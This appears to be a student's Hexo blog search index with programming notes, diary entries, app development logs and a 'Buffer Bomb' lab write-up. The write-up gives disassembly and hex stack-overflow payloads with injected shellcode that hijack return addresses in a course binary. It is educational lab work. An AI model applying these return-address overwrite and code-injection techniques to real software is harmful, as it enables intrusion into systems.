{"posts":[{"title":"1024","text":"LeetCode 1024 勋章拿下 不知不觉快400了，虽然有一半是水SQL的","link":"/2022/10/22/1024/"},{"title":"11.27","text":"搞RecycleView看的人头疼,国内的教学视频看了半天听了一堆屎,还是国外的教程比较优质,尽管我不一定全能听懂英语但也觉得比国内的教程好太多了,浪费我那么多时间真的生气","link":"/2021/11/27/11-27/"},{"title":"12.1","text":"我们都曾受过伤，才能称为彼此的太阳万物皆有裂痕，那是光照进来的地方","link":"/2021/12/01/12-1/"},{"title":"12.2","text":"给博客加了LiveRe评论系统，虽然我也不知道搞这个东西有啥用","link":"/2021/12/02/12-2/"},{"title":"12.6","text":"把图床从github换成了 SM.MSgithub不挂梯子有时候看不见图，挂梯子加载博客卡的一批我懒得设白名单，好像之前上传到github上的图也改不了了who cares? 测试用图 结果我还是把之前的图片替换了，谁叫我闲呢 我顺便更新了hexo的markdown渲染器，现在文章可以用latex的公式了","link":"/2021/12/06/12-6/"},{"title":"1年了","text":"今早阿里云给我发短信提示域名续费，才发现这博客我已经整了一年了..","link":"/2022/10/27/1%E5%B9%B4%E4%BA%86/"},{"title":"AndroidStudio Toast弹出消息框","text":"Toast.makeText(参数1,参数2,参数3); 参数1传Context(Activity) 参数2是文本内容 参数3是显示时长 分为 Toast.LENGTH_SHORT 和 Toast.LENGTH_LONG 注意在写完makeText以后调用.show()方法，不然不显示！","link":"/2021/11/07/AndroidStudio-Toast%E5%BC%B9%E5%87%BA%E6%B6%88%E6%81%AF%E6%A1%86/"},{"title":"200题纪念","text":"200题纪念 莫名其妙已经200题了，虽然还是没进100k，不过也快了，从疫情封校以来开始疯狂刷题，刚开始刷的时候基础只有二三十题吧，去年骗刘伟一同合资的plus会员实际上也只有我一个人在用，至少不能让其亏本。从一开始的题目框架都看不懂到现在每天坚持签到题和每周坚持周赛，总的来说还是有很多收获的，熟悉了很多学过而不熟练的算法，不夸张的说dfs和bfs虽然高中就学过，但现在才能算掌握，之前在高中时接触的算法现在大抵全部忘光了，不过也不晚，现在也是重新拾起的时候。在长时间高强度的刷题情况下我也产生了许多的疑问，尤其打击最大第一次是在我刷了快100题的时候蓝桥杯省赛即将开始，我满怀着信心在前一天晚上打算刷一下往届题练手，但是突然发现去年不会做的题今年照样不会，我才意识到力扣和算法竞赛网站的区别，一个是面向工作，一个是面向竞赛，可以说我在力扣刷的200题强度远不及我之前在洛谷刷的算法题的强度，因此如果单靠每周坚持力扣计划可能在竞赛方面仍然没有什么建树，不过这也不影响我这一个月来学到的东西的价值，代码还是要多写，所有知识只能在实践种学会，经验比资质重要，如果我能早点晓得这些道理，也许就能少走一些弯路，anyway，至少先以千题为目标，至少得拿个免费T恤，但是重心得转移，因为力扣能带来的长进是有限的，下一步可能考虑去刷牛客，或者ACWING，或者重回洛谷，其他项目也要多做，尤其是这次挑战杯一个微信小程序都能把人折磨得死去活来，所以本科学到的知识和工作所需要的经验是完全不匹配的，因此绝对不仅仅满足于本科课程的知识，该练的还是得练，坚持下去，做到更好的自己便可以了。","link":"/2022/04/20/200%E9%A2%98%E7%BA%AA%E5%BF%B5/"},{"title":"C#事件","text":"C#事件（Event）事件即一个操作比较像是 if(true){} 括号中的内容，只不过换成了函数事件在一个类内定义，通常把这个类称为发布器，即发布器类 基于委托定义事件即为先定义一个委托，再从这个委托的基础上定义一个事件例如： 1234567891011121314151617181920212223public class EventClass//发布器类{ //定义委托 public delegate void FunctionHandler(); //基于委托定义事件 public event FunctionHandler Function; //定义触发函数 public void TriggeredFunction() { if(条件满足) Function; else ... }} public class SubscribeClass//订阅器类{ //注意此函数返回值类型一定要满足委托的参数类型 public void functionForTrigged();} 实例化与注册在main函数中实例化，并将订阅器实例注册到事件中 注册时使用 “+=” 符号 12345678910static void Main(string[] args){ //实例化 EventClass e = new EventClass(); SubscribeClass s = new SubscribeClass(); //注册 e.Function += new EventClass.FunctionHandler(s.functionForTrigged); }","link":"/2021/11/19/C-%E4%BA%8B%E4%BB%B6/"},{"title":"C#委托","text":"C#委托（Delegate）委托的声明声明委托的语法delegate &lt;return type&gt; &lt;delegate-name&gt; &lt;parameter list&gt; parameter list : 参数列表 例如 :public delegate int MyDelegate (string s); 该委托可被用于引用任何一个带有一个单一的 string 参数的方法，并返回一个 int 类型变量。 委托的实例化委托对象使用 new 关键字来创建，创建时委托的参数是一个特定的函数，这个特定的函数不用写参数 例如 : 1234public delegate int MyDelegate (string s);...MyDelegate md1 = new MyDelegate(function1);MyDelegate md2 = new MyDelegate(function2);","link":"/2021/11/12/C-%E5%A7%94%E6%89%98/"},{"title":"KMP","text":"KMP 字符串匹配普通的字符串匹配算法十分直观易懂，但是遇到特殊情况效率极低，因此KMP算法是一种高效的字符串匹配算法 算法的核心思路是减少重复匹配的次数从而降低时间复杂度 普通匹配算法的时间复杂度 O(mn) KMP算法的时间复杂度 O(m+n) 算法的实现(cpp) 获取next数组 1234567891011121314151617/*get Next*/vector&lt;int&gt; buildNext(string patten){ int j = 0, m = patten.length();// j-&gt;“主”串指针 vector&lt;int&gt; next(m, 0); int t = -1;//t-&gt;模式串指针 next[0] = -1;//next数组第一位初始化为-1 while(j &lt; m - 1){ if(t &lt; 0 || patten[t] == patten[j]){//匹配 t++; j++; next[j] = t; } else t = next[t]; } return next; } 匹配算法 12345678910111213141516171819/*KMP*/int KMP(string haystack, string needle) { int i = 0, j = 0; int n = haystack.length(), m = needle.length(); if(m == 0)return 0;//边界情况判断 vector&lt;int&gt; next = getNext(needle);//获取next数组 while(i &lt; n &amp;&amp; j &lt; m){ if(j &lt; 0 || haystack[i] == needle[j]){ i++; j++; if(j == m) return i-j;//如果到了模式串末尾且匹配，返回其在主串中的位置 } else j = next[j];//模式串右移 } return -1;//未找到返回-1 }","link":"/2022/03/24/KMP/"},{"title":"C#接口","text":"C#接口（Interface） C#中的接口与抽象类十分类似，但是接口大多只是用在当只有少数方法由基类声明由派生类实现时 接口本身并不实现任何功能 接口定义了属性、方法和事件，这些都是接口的成员。接口只包含了成员的声明。成员的定义是派生类的责任。 与抽象类一样，接口不能被实例化。 接口的定义 关键字 interface 默认为 public 1234interface myInterface(){ void MethodToImplement();} 接口的继承接口的继承与抽象类的继承类似 如果一个接口继承其他接口，那么实现类或结构就需要实现所有接口的成员。 继承的接口方法不用像抽象类用override覆写，重载即可。 1234class InterfaceImplementer: myInterface{ //code} 自定义泛型接口（Generic Interface）泛型接口类似于C++中的模板类 定义泛型接口：1234567interface IMyInterface&lt;T&gt; //定义具有一个类型参数的泛型接口{ void MyFunc(T obj); //声明参数为T的方法} 声明泛型类继承自泛型接口：12345678910111213public class MyClass&lt;T&gt; : IMyInterface&lt;T&gt;{ public void MyFunc(T obj) { //do… }} 实例化：12//指定类型参数为string类型，创角泛型类的实例赋值给泛型接口的变量IMyInterface&lt;string&gt; iMyInterface = new MyClass&lt;string&gt;(); 下程序创建了一个泛型接口用于打印从参数列表获取的信息 1234567891011121314151617181920212223242526272829303132//创建泛型接口interface IMyInterface&lt;T&gt;{ void printMsg(T str);}//声明泛型类继承泛型接口public class printClass&lt;T&gt; : IMyInterface&lt;T&gt;{ public void printMsg(T str) { Console.WriteLine(str); }}static void Main(string[] args){ //实例化打印string类型的泛型类 IMyInterface&lt;string&gt; strInterface = new printClass&lt;string&gt;(); strInterface.printMsg(&quot;That's right&quot;); //实例化打印int类型的泛型类 IMyInterface&lt;int&gt; intInterface = new printClass&lt;int&gt;(); intInterface.printMsg(605); //实例化打印double类型的泛型类 IMyInterface&lt;double&gt; doubleInterface = new printClass&lt;double&gt;(); doubleInterface.printMsg(2.333);}","link":"/2021/11/12/C-%E6%8E%A5%E5%8F%A3/"},{"title":"DEBUG命令","text":"寄存器cpu中寄存器用于存储内存中数据的物理地址 CSCS 为代码段寄存器，一般用于存放代码通常和IP使用用于处理下一条执行的代码cs:IP // 基地址：偏移地址CS地址对应的数据，相当于c语言中的代码语句 DSDS 为数据段寄存器，一般用于存放数据DS地址对应的数据，相当于c语言中的全局变量 SSESDEBUG各命令R命令作用：观看和修改寄存器的值 可以使用R命令修改寄存器的值 例如：将DS值改为000 输入R DS，先返回DS当前地址，在“：”后输入新地址 D命令作用：显示内存区域的内容 最左边是内存的起始地址，中间以十六进制的形式显示内存值，最右边是以ASCII码的形式显示内存值。每行最多显示16个字节的内容 E命令作用：改变内存单位的内容 使用方式：E [起始位置] 在提示符“-”下输入以下命令：E 1AF5:100 DEBUG首先显示[1AF5:0000]的内容00.，这时可以修改该字节的值。如果还要修改后续的内容，可以按空格键继续。当要跳过某个字节时，可以按连续的两个空格跳到后一个字节去 T命令作用：执行汇编程序，单步跟踪 使用方式：T命令的使用方式是T [=地址] [指令数]。如果忽略“地址”的话，T命令从CS:IP处开始运行。“指令数”是要单步执行的指令的数量。 U命令作用：对机器代码反汇编显示 使用方式：U [范围] 如果范围参数只输入了起始地址，则只对20H个字节的机器代码反汇编 G命令作用：执行汇编指令 使用方式：G [=起始地址] [断点地址]","link":"/2021/11/24/DEBUG%E5%91%BD%E4%BB%A4/"},{"title":"Linux基本操作","text":"Linux 基本操作终端相关 打开终端 Ctrl + Alt + T","link":"/2021/11/10/Linux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"},{"title":"My First Post","text":"我想这应该是第一篇博客了，写完是不是还要部署啊。。","link":"/2021/11/07/My-First-Post/"},{"title":"OUCpass-log-1","text":"OUCpass 开发日志[1]在我很早的时候就有想开发一款多功能小程序的想法了，起初是学习了图像技术想把校门扫码的红码自动转换成绿码，无奈Android开发遇到一些问题导致搁置，后来用小程序直接写出了绿码页面，再后来自己写了一些每日上报脚本，打卡脚本之类的东西，想到可以把这些功能整合在一起，于是有了开发OUCpass的概念 我的初步设想是先完成一些基础功能，类似于WeOUC，查课表，查成绩，先完成这些功能后，再把我自己的想法加上去。 可是我再一开始就遇到了很多问题，比如如何使用脚本登陆教务系统 我参考了许多别人的博客，先检查教务系统表单项，看看登陆的时候发送了什么请求 很明显是通过POST向http://jwgl.ouc.edu.cn/cas/logon.action发送请求，POST请求肯定是带有表单数据的，查看数据发现长成这样： 这些数据里面一眼就能看出来的是randnumber既是我们填写的随机验证码 剩下两个加密过的东西很明显就是一个账号一个密码了，但是直接把他们放到解密软件内是无法获取原文的，这里我参考了一位大佬的博客 python爬虫模拟登录学校教务系统（青果教务系统）并查询个人成绩 按照他的方法，获取了加密方式，下一步就是通过程序构造表单以及发送POST请求 过程完毕后我成功登上了教务系统并获取了首页的课表 虽然百度OCR的识别精度不是很高，但是多试几次还是可以的，至此我的第一阶段的内容就完成了，我已成功登陆教务系统，接下来就可以发送请求获取各种信息了","link":"/2022/09/08/OUCpass-log-1/"},{"title":"OUCpass-log-2","text":"OUCpass 开发日志[2]在上一次我成功登录到教务系统以后，我就开始着手前端与后端的工作，前端微信小程序我一开始打算直接用组件库，但是weUI两年多不更新，而且文档也写得十分粗糙，我就打算另谋其他组件库，发现vant-ui还在更新，而且文档还能看，就打算使用vant-ui开发 暂时没想好主页和个人页面的设计，打算先写工具页面，因为这样能最先就和后端联系 后端打算用nodeJs express实现，因为看着相对比较简单，但实际上还是遇到了诸多问题 因为我的登陆脚本是用Python实现的，服务器又是用nodeJs写的，我得想办法让 js 读取我的 python 的输出，我查了相关的教程，一开始用PythonShell，发现不会操作，后来又用child_process之类的，总之是能用 但是发现获取的结果是中文乱码，又用iconv组件转码，这样才获取了正确的输出 输出完了还不算完，我又发现exec执行的过程和 response 的发送过程对不上，我又去学了javaScript的同步异步函数，说实话我之前对javaScript基本没什么掌握，什么回调函数，同步异步之类的完全不知道，包括=&gt; 这种 arrow function，== 和===的区别，好在 YouTube 上相关教程还都挺不错，重点是我现在基本能听懂英文教程了，这点还是让我很满意的，相对语言的中文翻译我似乎就没怎么在意了，比如=&gt; arrow funtion中文翻译是啥我到现在不知道，「箭函数」嘛..，不是很大的问题，我觉得用英文掌握一门语言更有优势，于是我用Promise功能解决了先执行python脚本再把输出作为response响应回去的问题 现在访问服务器能把课表给我发过来了，是一个好的开始，我可以着手下一步的课表前端与后端对接了","link":"/2022/09/09/OUCpass-log-2/"},{"title":"OUCpass-log-3","text":"","link":"/2022/09/11/OUCpass-log-3/"},{"title":"P1157-组合的输出","text":"题目链接 组合的输出，不论是在算法题目中，还是日常编程中都十分常遇到 题目题目描述 输入格式输出格式 输入输出样例输入 #1 15 3 输出 #1 123456789101 2 31 2 41 2 51 3 41 3 51 4 52 3 42 3 52 4 53 4 5 代码12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;#include &lt;cstdlib&gt;#include &lt;iomanip&gt;#include &lt;vector&gt;using namespace std;int n, r;int num[100]; //满足100位元素//k表示当前正在计算第k位void dfs(int k){ //如果k超过了元素数 if (k &gt; r) { //输出当前组合 for (int i = 1; i &lt;= r; i++) { cout &lt;&lt; setw(3) &lt;&lt; num[i]; } cout &lt;&lt; endl; return; } //如果没超过元素数，则从k+1位开始搜索 for (int i = num[k - 1] + 1; i &lt;= n; i++) { num[k] = i; dfs(k + 1); }}int main(){ cin &gt;&gt; n &gt;&gt; r; dfs(1); return 0;} 题目分析从n个数获得r个元素的组合，采用dfs深度优先搜索，从第1位搜到第r位，每一位都不超过n，一旦超过了所需元素数，便输出当前组合，接着从上一位开始，加1后继续搜索","link":"/2022/01/21/P1157-%E7%BB%84%E5%90%88%E7%9A%84%E8%BE%93%E5%87%BA/"},{"title":"Sep-5th","text":"小学期选修了移动软件开发，越学习越发现自己不会的东西实在是太多了，反编译别人的小程序得到的都是混淆代码根本无法阅读，像写一个类似weouc的程序但是连登陆教务系统都做不到，打算先学习学习nodejs，对后端几乎一窍不通，刚好可以用到买来的服务器","link":"/2022/09/05/Sep-5th/"},{"title":"Sep-16th","text":"我靠因为一个it++和++it问题debug了半个小时，服了","link":"/2022/09/16/Sep-16th/"},{"title":"the Buffer Bomb","text":"the Buffer Bomb事先准备 bufbomb反汇编 objdump -d bufbomb &gt; asm.txt 获取自己的cookie 12Userid: existoCookie: 0x73413ee0 Level 0: Candle要求在getbuf执行返回语句之前调用smoke函数，我们考虑利用缓冲区溢出的漏洞来修改getbuf函数的返回地址 12345678910111208049342 &lt;getbuf&gt;: 8049342: 55 push %ebp 8049343: 89 e5 mov %esp,%ebp 8049345: 83 ec 38 sub $0x38,%esp 8049348: 83 ec 0c sub $0xc,%esp 804934b: 8d 45 ce lea -0x32(%ebp),%eax 804934e: 50 push %eax 804934f: e8 ba fa ff ff call 8048e0e &lt;Gets&gt; 8049354: 83 c4 10 add $0x10,%esp 8049357: b8 01 00 00 00 mov $0x1,%eax 804935c: c9 leave 804935d: c3 ret 观察汇编指令，发现分配给字符串的空间是从%ebp - 0x32开始的，0x32也就是50个字节，返回地址在%ebp + 0x4处，而push %ebp又占用4个字节，因此整个结构便有0x32 + 0x4 + 0x4一共58个字节，我们要做的是，将smoke函数的开始地址覆盖getbuf的最后4个字节的返回地址，这样执行完getbuf函数后就会跳转到我们想要的位置 12345678910111213141508048ba1 &lt;smoke&gt;: 8048ba1: 55 push %ebp 8048ba2: 89 e5 mov %esp,%ebp 8048ba4: 83 ec 08 sub $0x8,%esp 8048ba7: 83 ec 0c sub $0xc,%esp 8048baa: 68 30 a3 04 08 push $0x804a330 8048baf: e8 5c fd ff ff call 8048910 &lt;puts@plt&gt; 8048bb4: 83 c4 10 add $0x10,%esp 8048bb7: 83 ec 0c sub $0xc,%esp 8048bba: 6a 00 push $0x0 8048bbc: e8 fe 08 00 00 call 80494bf &lt;validate&gt; 8048bc1: 83 c4 10 add $0x10,%esp 8048bc4: 83 ec 0c sub $0xc,%esp 8048bc7: 6a 00 push $0x0 8048bc9: e8 52 fd ff ff call 8048920 &lt;exit@plt&gt; 观察到smoke函数的起始地址为0x08048ba1，因此我们将前58 - 4 = 54字节用任意值填满即可，最后4字节放上我们的0x08048ba1 12345678910/*level 0*/00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 /*54个任意值*/a1 8b 04 08 储存为level0.txt文件，再使用提供的hex2raw程序转化为题目需要的string ./hex2raw &lt; level0.txt &gt; level0-raw.txt 之后的题目都是这个办法，因此不再赘述(除了level4需要加-n) level 0得解 Level 1: Sparkler要求和level 0类似，只不过这次要调用fizz函数，fizz函数需要输入一个参数，要求此参数是我们每个人独有的cookie 123456789101112131415161718192021222324252608048bce &lt;fizz&gt;: 8048bce: 55 push %ebp 8048bcf: 89 e5 mov %esp,%ebp 8048bd1: 83 ec 08 sub $0x8,%esp 8048bd4: 8b 55 08 mov 0x8(%ebp),%edx 8048bd7: a1 38 d1 04 08 mov 0x804d138,%eax 8048bdc: 39 c2 cmp %eax,%edx 8048bde: 75 22 jne 8048c02 &lt;fizz+0x34&gt; 8048be0: 83 ec 08 sub $0x8,%esp 8048be3: ff 75 08 pushl 0x8(%ebp) 8048be6: 68 4b a3 04 08 push $0x804a34b 8048beb: e8 50 fc ff ff call 8048840 &lt;printf@plt&gt; 8048bf0: 83 c4 10 add $0x10,%esp 8048bf3: 83 ec 0c sub $0xc,%esp 8048bf6: 6a 01 push $0x1 8048bf8: e8 c2 08 00 00 call 80494bf &lt;validate&gt; 8048bfd: 83 c4 10 add $0x10,%esp 8048c00: eb 13 jmp 8048c15 &lt;fizz+0x47&gt; 8048c02: 83 ec 08 sub $0x8,%esp 8048c05: ff 75 08 pushl 0x8(%ebp) 8048c08: 68 6c a3 04 08 push $0x804a36c 8048c0d: e8 2e fc ff ff call 8048840 &lt;printf@plt&gt; 8048c12: 83 c4 10 add $0x10,%esp 8048c15: 83 ec 0c sub $0xc,%esp 8048c18: 6a 00 push $0x0 8048c1a: e8 01 fd ff ff call 8048920 &lt;exit@plt&gt; 可以观察到fizz函数的起始地址0x08048bce，与level 0相似我们首先还是需要覆盖getbuf的返回地址为0x08048bce，先保证调用fizz函数，fizz函数中将参数放在0x8(%ebp)位置，此%ebp为新ebp，既是getbuf返回地址处新push的%ebp，因此我们需要将cookie放在新%ebp+0x8位置 123456789101112/*level 1*/00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 /*54个任意值*/ce 8b 04 08 /*fizz地址*/00 00 00 00 /*%ebp+0x4*/e0 3e 41 73 /*%ebp+0x8处放cookie*/ level 1得解 Level 2: Firecracker任务要求仍然是在getbuf执行返回语句之前调用其他函数，这次调用bang函数，并且要求将global_value设置成自己的cookie 123456789101112131415161718192021222324252627282908048c1f &lt;bang&gt;: 8048c1f: 55 push %ebp 8048c20: 89 e5 mov %esp,%ebp 8048c22: 83 ec 08 sub $0x8,%esp 8048c25: a1 40 d1 04 08 mov 0x804d140,%eax 8048c2a: 89 c2 mov %eax,%edx 8048c2c: a1 38 d1 04 08 mov 0x804d138,%eax 8048c31: 39 c2 cmp %eax,%edx 8048c33: 75 25 jne 8048c5a &lt;bang+0x3b&gt; 8048c35: a1 40 d1 04 08 mov 0x804d140,%eax 8048c3a: 83 ec 08 sub $0x8,%esp 8048c3d: 50 push %eax 8048c3e: 68 8c a3 04 08 push $0x804a38c 8048c43: e8 f8 fb ff ff call 8048840 &lt;printf@plt&gt; 8048c48: 83 c4 10 add $0x10,%esp 8048c4b: 83 ec 0c sub $0xc,%esp 8048c4e: 6a 02 push $0x2 8048c50: e8 6a 08 00 00 call 80494bf &lt;validate&gt; 8048c55: 83 c4 10 add $0x10,%esp 8048c58: eb 16 jmp 8048c70 &lt;bang+0x51&gt; 8048c5a: a1 40 d1 04 08 mov 0x804d140,%eax 8048c5f: 83 ec 08 sub $0x8,%esp 8048c62: 50 push %eax 8048c63: 68 b1 a3 04 08 push $0x804a3b1 8048c68: e8 d3 fb ff ff call 8048840 &lt;printf@plt&gt; 8048c6d: 83 c4 10 add $0x10,%esp 8048c70: 83 ec 0c sub $0xc,%esp 8048c73: 6a 00 push $0x0 8048c75: e8 a6 fc ff ff call 8048920 &lt;exit@plt&gt; 注意到两个参数，一个0x804d140，一个0x804d138，我们需要知道哪个是global_value 经过gdb调试发现0x804d140就是我们要修改的参数，所以我们的任务就是 修改global_value为我们自己的cookie 将bang函数起始地址0x08048c1f压栈 ret指令执行bang函数 1234/*汇编代码*/movl $0x73413ee0, 0x804d140push $0x08048c1fret 将汇编代码转化为机器码 gcc -c fun2.s objdump -d fun2.o 123456/*机器码*/00000000 &lt;.text&gt;: 0: c7 05 40 d1 04 08 e0 movl $0x73413ee0,0x804d140 7: 3e 41 73 a: 68 1f 8c 04 08 push $0x8048c1f f: c3 ret 问题来了，如何让程序执行我们的汇编代码，我们可以将getbuf的返回地址改为我们的代码的起始地址，这样程序就会执行我们的代码，修改变量并进入bang函数，那么首先我们得找出我们的函数的起始地址，肯定不是0x00000000，那么是啥呢，我们知道我们是通过字符串的溢出修改的代码，那么我们的字符串的首地址不就是我们的函数代码起始地址吗，知道了这个，我们只要找到字符串的首地址即可，从getbuf里找 12345678910111208049342 &lt;getbuf&gt;: 8049342: 55 push %ebp 8049343: 89 e5 mov %esp,%ebp 8049345: 83 ec 38 sub $0x38,%esp 8049348: 83 ec 0c sub $0xc,%esp 804934b: 8d 45 ce lea -0x32(%ebp),%eax 804934e: 50 push %eax 804934f: e8 ba fa ff ff call 8048e0e &lt;Gets&gt; 8049354: 83 c4 10 add $0x10,%esp 8049357: b8 01 00 00 00 mov $0x1,%eax 804935c: c9 leave 804935d: c3 ret 我们看到再调用Gets函数之前push了%eax，那么这个%eax就是字符串的首地址，也就是我们函数的起始地址，于是我们只要在调用Gets前设置一个断点，然后检查%eax的值即可 所以我们%eax的值为0x55682f5e，既是我们函数的起始地址，覆盖getbuf的返回地址 1234567891011c7 05 40 d1 04 08 e0 3e 41 73 68 1f 8c 04 08 c3 /*函数代码*/00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 5e 2f 68 55/*%eax地址*/ level 2得解 Level 3: Dynamite任务要求正常调用getbuf，但是修改getbuf的返回值为我们的cookie(原本为1)，同时要求栈空间被还原，既复原saved ebp 1234567891011121314151617181920212223242526272829303132333435363738394008048c7a &lt;test&gt;: 8048c7a: 55 push %ebp 8048c7b: 89 e5 mov %esp,%ebp 8048c7d: 83 ec 18 sub $0x18,%esp 8048c80: e8 48 04 00 00 call 80490cd &lt;uniqueval&gt; 8048c85: 89 45 f0 mov %eax,-0x10(%ebp) 8048c88: e8 b5 06 00 00 call 8049342 &lt;getbuf&gt; 8048c8d: 89 45 f4 mov %eax,-0xc(%ebp) 8048c90: e8 38 04 00 00 call 80490cd &lt;uniqueval&gt; 8048c95: 89 c2 mov %eax,%edx 8048c97: 8b 45 f0 mov -0x10(%ebp),%eax 8048c9a: 39 c2 cmp %eax,%edx 8048c9c: 74 12 je 8048cb0 &lt;test+0x36&gt; 8048c9e: 83 ec 0c sub $0xc,%esp 8048ca1: 68 d0 a3 04 08 push $0x804a3d0 8048ca6: e8 65 fc ff ff call 8048910 &lt;puts@plt&gt; 8048cab: 83 c4 10 add $0x10,%esp 8048cae: eb 41 jmp 8048cf1 &lt;test+0x77&gt; 8048cb0: 8b 55 f4 mov -0xc(%ebp),%edx 8048cb3: a1 38 d1 04 08 mov 0x804d138,%eax 8048cb8: 39 c2 cmp %eax,%edx 8048cba: 75 22 jne 8048cde &lt;test+0x64&gt; 8048cbc: 83 ec 08 sub $0x8,%esp 8048cbf: ff 75 f4 pushl -0xc(%ebp) 8048cc2: 68 f9 a3 04 08 push $0x804a3f9 8048cc7: e8 74 fb ff ff call 8048840 &lt;printf@plt&gt; 8048ccc: 83 c4 10 add $0x10,%esp 8048ccf: 83 ec 0c sub $0xc,%esp 8048cd2: 6a 03 push $0x3 8048cd4: e8 e6 07 00 00 call 80494bf &lt;validate&gt; 8048cd9: 83 c4 10 add $0x10,%esp 8048cdc: eb 13 jmp 8048cf1 &lt;test+0x77&gt; 8048cde: 83 ec 08 sub $0x8,%esp 8048ce1: ff 75 f4 pushl -0xc(%ebp) 8048ce4: 68 16 a4 04 08 push $0x804a416 8048ce9: e8 52 fb ff ff call 8048840 &lt;printf@plt&gt; 8048cee: 83 c4 10 add $0x10,%esp 8048cf1: 90 nop 8048cf2: c9 leave 8048cf3: c3 ret 可以看到调用getbuf后，返回值被储存在%eax中，于是我们只要修改%eax的值为我们的cookie即可，同时要求复原%ebp，那么我们在调用getbuf记住%ebp的值，再执行我们的语句时重新赋给%ebp即可，我们先在调用getbuf前设置断点，查看%ebp的值 可见%ebp的值为0x55682fb0，整理一下我们的任务 设置%eax为我们的cookie 0x73413ee0 设置%ebp为初始值0x55682fb0 回到test函数中调用getbuf后的下一个语句地址0x8048c8d 12345/*汇编代码*/movl $0x73413ee0, %eaxmovl $0x55682fb0, %ebppush $0x8048c8dret 123456/*机器码*/00000000 &lt;.text&gt;: 0: b8 e0 3e 41 73 mov $0x73413ee0,%eax 5: bd b0 2f 68 55 mov $0x55682fb0,%ebp a: 68 8d 8c 04 08 push $0x8048c8d f: c3 ret 接着步骤和之前相同 1234567891011b8 e0 3e 41 73 bd b0 2f 68 55 68 8d 8c 04 08 c3 /*函数代码*/00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 5e 2f 68 55/*%eax地址*/","link":"/2021/12/25/bufbomb/"},{"title":"Vector用法总结","text":"Vector用法总结好久没更新博客了，最近狂刷LeetCode，总结一下遇到的常用的Vector容器的用法 vector定义 创建一个vector vector&lt;T&gt; arr 创建n个size的vector vector&lt;T&gt; arr(int n) 创建n个size，值全为t的vector vector&lt;T&gt; arr(int n, T t) 拷贝另一个vector vector&lt;T&gt; arr(vector&lt;T&gt; anotherArr) 拷贝另一个vector的一部分 vector&lt;T&gt; arr(anotherArr.start(), anotherArr.end()) vector增加元素 添加一个元素 arr.push_back(T val) 在C++11新增了一个函数emplace_back效率比push_back要高，所以尽量用emplace_back。 arr.emplace_back(T val) vector删除元素 删除一个元素 arr.erase(iterator first, iterator last) 清空所有元素 arr.clear() 注意：clear函数不会把元素清零，只是把size设置为0，capacity不变 清空内存 vector&lt;T&gt;().swap(arr) 删除尾部元素 arr.pop_back() 因此完全可以把vector当stack来用 vector判断是否为空 判断是否为空 arr.empty() 空返回true，否则返回false vector大小 返回元素个数 arr.size() vector遍历一维vector遍历 下标遍历 123for(int i = 0; i &lt; arr.size(); ++i){ cout &lt;&lt; arr[i];} 迭代器遍历 123for(auto it = arr.begin(); it != arr.end(); ++it){ cout &lt;&lt; (*it);} 我也不知道是什么遍历，但是很方便 123for(T element : arr){ cout &lt;&lt; element;} 二维vector遍历 下标遍历 12345for(int i = 0; i &lt; arr.size(); ++i){ for(int j = 0; j &lt; arr[i].size(); ++i){ cout &lt;&lt; arr[i][j]; }} 迭代器遍历 12345for(auto it = arr.begin(); it != arr.end(); ++it){ for(int i = 0; it &lt; (*it).size(); ++i){ cout &lt;&lt; (*it)[i]; }} 返回最大值、最小值 返回最大值 max_element(iterator first, iterator last) 注意返回的是迭代器 返回最小值 min_element(iterator first, iterator last) 求加和结果 累加数组和 accumulate(arr.begin(), arr.end(), 0)","link":"/2022/03/16/Vector%E7%94%A8%E6%B3%95%E6%80%BB%E7%BB%93/"},{"title":"deque","text":"Deque 双端队列295场周赛T4，01BFS用到双端队列，之前很少接触这个数据结构 Double-ended queues are sequence containers with the feature of expansion and contraction on both ends. 由此可见，双端队列也就是一个可以在front-end和back-end两端插入或删除的数据罢了 用法 例子： 1234567891011121314151617181920212223242526272829303132333435363738394041// CPP Program to implement Deque in STL#include &lt;deque&gt;#include &lt;iostream&gt;using namespace std;void showdq(deque&lt;int&gt; g){ deque&lt;int&gt;::iterator it; for (it = g.begin(); it != g.end(); ++it) cout &lt;&lt; '\\t' &lt;&lt; *it; cout &lt;&lt; '\\n';}int main(){ deque&lt;int&gt; gquiz; gquiz.push_back(10); gquiz.push_front(20); gquiz.push_back(30); gquiz.push_front(15); cout &lt;&lt; &quot;The deque gquiz is : &quot;; showdq(gquiz); cout &lt;&lt; &quot;\\ngquiz.size() : &quot; &lt;&lt; gquiz.size(); cout &lt;&lt; &quot;\\ngquiz.max_size() : &quot; &lt;&lt; gquiz.max_size(); cout &lt;&lt; &quot;\\ngquiz.at(2) : &quot; &lt;&lt; gquiz.at(2); cout &lt;&lt; &quot;\\ngquiz.front() : &quot; &lt;&lt; gquiz.front(); cout &lt;&lt; &quot;\\ngquiz.back() : &quot; &lt;&lt; gquiz.back(); cout &lt;&lt; &quot;\\ngquiz.pop_front() : &quot;; gquiz.pop_front(); showdq(gquiz); cout &lt;&lt; &quot;\\ngquiz.pop_back() : &quot;; gquiz.pop_back(); showdq(gquiz); return 0;} Output 12345678910The deque gquiz is : 15 20 10 30gquiz.size() : 4gquiz.max_size() : 4611686018427387903gquiz.at(2) : 10gquiz.front() : 15gquiz.back() : 30gquiz.pop_front() : 20 10 30gquiz.pop_back() : 20 10","link":"/2022/05/29/deque/"},{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","link":"/2021/11/06/hello-world/"},{"title":"binary bomb lab","text":"Binary Bomb Lab这个实验很好玩，所以操你妈 phase_11234567891011121308048b30 